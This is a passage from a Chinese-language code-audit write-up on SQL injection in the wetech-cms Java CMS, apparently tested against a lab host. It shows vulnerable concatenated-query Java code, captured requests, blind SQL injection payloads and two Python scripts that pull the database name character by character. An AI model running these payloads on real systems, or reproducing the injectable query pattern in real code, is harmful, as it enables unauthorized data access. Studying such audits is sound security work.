+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>topics</span><span class=p>.</span><span class=na>getDatas</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 54行-search:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/search/{con}&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>search</span><span class=p>(</span><span class=nd>@PathVariable</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>con</span><span class=p>,</span><span class=n>Model</span><span class=w> </span><span class=n>model</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setOrder</span><span class=p>(</span><span class=s>&#34;asc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setSort</span><span class=p>(</span><span class=s>&#34;c.orders&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;cs&#34;</span><span class=p>,</span><span class=w> </span><span class=n>channelService</span><span class=p>.</span><span class=na>listChannelByType</span><span class=p>(</span><span class=n>ChannelType</span><span class=p>.</span><span class=na>NAV_CHANNEL</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setOrder</span><span class=p>(</span><span class=s>&#34;desc&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>SystemContext</span><span class=p>.</span><span class=na>setSort</span><span class=p>(</span><span class=s>&#34;t.publishDate&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=n>topics</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>topicService</span><span class=p>.</span><span class=na>searchTopic</span><span class=p>(</span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>focus</span><span class=p>(</span><span class=n>topics</span><span class=p>,</span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;datas&#34;</span><span class=p>,</span><span class=w> </span><span class=n>topics</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>model</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;con&#34;</span><span class=p>,</span><span class=w> </span><span class=n>con</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=s>&#34;index/search&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 分析代码我们可知，这里仅仅只是对查询语句进行了排序。我们先看第一个</p><h6 id=42行-search>42行-search:</h6><p>​ 根据路由我们定位到前端搜索功能，搜索后抓包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/search.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>7</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/?</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=5EA494FF429C210478C61A1E2BA26079</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>con=123
+</span></span></code></pre></td></tr></table></div></div><p>​ 输出单引号后发现报错，尝试构造SQL语句，得到payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-SQL data-lang=SQL><span class=line><span class=cl><span class=mi>1</span><span class=o>%</span><span class=s1>&#39; and content like (case when ascii(substr(database(),1,1))=1 then &#39;&#39; else &#39;</span><span class=o>%</span><span class=s1>&#39; end) or content like &#39;</span><span class=mi>1</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 根据该payload，我们有如下python脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=n>true_of_payload</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;con&#34;</span> <span class=p>:</span> <span class=s2>&#34;1%&#39; and content like (case when ascii(substr(database(),1,1))=1 then &#39;&#39; else &#39;%&#39; end) or content like &#39;1&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://172.21.55.165:8888/search&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>req</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=n>true_of_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>true_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>64</span><span class=p>,</span><span class=mi>127</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;con&#34;</span> <span class=p>:</span> <span class=s2>&#34;1%&#39; and content like (case when ascii(substr(database(),</span><span class=si>{}</span><span class=s2>,1))=</span><span class=si>{}</span><span class=s2> then &#39;&#39; else &#39;%&#39; end) or content like &#39;1&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span> <span class=o>!=</span> <span class=n>true_len</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>j</span><span class=p>),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>req</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 成功获取库名：</p><p><img src=/p/wetech-cms/image-20241127145422588-1732721891176-6-1732797677431-3.png width=579 height=54 srcset="/p/wetech-cms/image-20241127145422588-1732721891176-6-1732797677431-3_hu12175628881149101963.png 480w, /p/wetech-cms/image-20241127145422588-1732721891176-6-1732797677431-3_hu7590445884739644812.png 1024w" loading=lazy alt=image-20241127145422588 class=gallery-image data-flex-grow=1072 data-flex-basis=2573px></p><h6 id=54行-search>54行-search:</h6><p>​ 我们抓包获取如下的数据包:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/search/1123</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>7</span>
+</span></span><span class=line><span class=cl><span class=n>X-Requested-With</span><span class=o>:</span> <span class=l>XMLHttpRequest</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/javascript, */*; q=0.01</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.55.165:8888/?</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>JSESSIONID=5EA494FF429C210478C61A1E2BA26079</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>con=123
+</span></span></code></pre></td></tr></table></div></div><p>​ 尝试输入单引号，发现报错，尝试构造payload，得到如下payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; or keyword like (case when ascii(substr(database(),1,1))=1 then &#39;</span><span class=n>a</span><span class=s1>&#39; else &#39;&#39; end) and keyword like &#39;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 发现该payload与第47行-search-TopicByKeyword的SQL注入payload相同，所以我们直接将之前所给脚本进行修改即可，于是我们有如下python脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://172.21.55.165:8888/search/1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>url1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),1,1))=10 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前十个字符串的10位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url2</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),1,1))=100 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url1_1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),10,1))=10 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前一百个字符串的10位false包</span>
+</span></span><span class=line><span class=cl><span class=n>url2_1</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),10,1))=100 then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=c1>#前一百个字符串的100位false包</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>req</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>req1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url1</span><span class=p>)</span><span class=c1>#获取前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url2</span><span class=p>)</span><span class=c1>#获取前十个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req1_1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url1_1</span><span class=p>)</span><span class=c1>#获取前一百个字符串的10位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>req2_1</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url2_1</span><span class=p>)</span><span class=c1>#获取前一百个字符串的100位false包</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len2</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len1_1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req1_1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r_len2_1</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>req2_1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>12</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span><span class=mi>127</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>payload</span><span class=o>=</span><span class=s2>&#34;&#39; or keyword like (case when ascii(substr(database(),</span><span class=si>{i}</span><span class=s2>,1))=</span><span class=si>{k}</span><span class=s2> then &#39;a&#39; else &#39;&#39; end) and keyword like &#39;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=n>i</span><span class=p>,</span><span class=n>k</span><span class=o>=</span><span class=n>k</span><span class=p>)</span><span class=c1>#SQL注入payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>th_url</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=n>payload</span>
+</span></span><span class=line><span class=cl>            <span class=n>second</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>th_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s_len</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>second</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=mi>100</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len1_1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>s_len</span> <span class=o>!=</span> <span class=n>r_len2_1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>k</span><span class=p>),</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>req</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 成功获取库名：</p><p><img src=/p/wetech-cms/image-20241127150723049-1732721891177-7-1732797677431-4.png width=584 height=59 srcset="/p/wetech-cms/image-20241127150723049-1732721891177-7-1732797677431-4_hu14698508418346953760.png 480w, /p/wetech-cms/image-20241127150723049-1732721891177-7-1732797677431-4_hu15905984531063250955.png 1024w" loading=lazy alt=image-20241127150723049 class=gallery-image data-flex-grow=989 data-flex-basis=2375px></p><h4 id=srcmainjavatechwetechcmsdaouserdaojava成功>src/main/java/tech/wetech/cms/dao/UserDao.java(成功)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>User</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findUser</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>gId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>rId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>searchCode</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>searchValue</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;from User u where 1=1&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isNotBlank</span><span class=p>(</span><span class=n>searchCode</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isNotBlank</span><span class=p>(</span><span class=n>searchValue</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;id&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>searchCode</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>hql</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34; and u.id like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>searchValue</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;username&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>searchCode</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>hql</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34; and u.username like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>searchValue</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;nickname&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>searchCode</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=n>hql</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34; and u.nickname like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>searchValue</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
